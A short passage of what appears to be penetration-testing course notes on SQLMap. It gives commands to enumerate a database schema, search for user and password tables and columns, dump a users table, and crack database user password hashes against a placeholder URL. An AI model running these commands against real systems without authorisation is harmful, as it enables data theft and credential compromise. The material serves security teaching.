
## DB Schema Enumeration

```shell-session

sqlmap -u "http://www.example.com/?id=1" --schema
```
## Searching for Data

When dealing with complex database structures with numerous tables and columns, we can search for databases, tables, and columns of interest, by using the `--search` option. This option enables us to search for identifier names by using the `LIKE` operator. For example, if we are looking for all of the table names containing the keyword `user`, we can run SQLMap as follows:

```shell-session

sqlmap -u "http://www.example.com/?id=1" --search -T user
```

We could also have tried to search for all column names based on a specific keyword (e.g. `pass`):

```shell-session

sqlmap -u "http://www.example.com/?id=1" --search -C pass
```

## Password Enumeration and Cracking

```shell-session

sqlmap -u "http://www.example.com/?id=1" --dump -D master -T users
```

## DB Users Password Enumeration and Cracking

SQLMap has a special switch `--passwords` designed especially for such a task:

```shell-session
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

 The '--all' switch in combination with the '--batch' switch, will automa(g)ically do the whole enumeration process on the target itself, and provide the entire enumeration details.
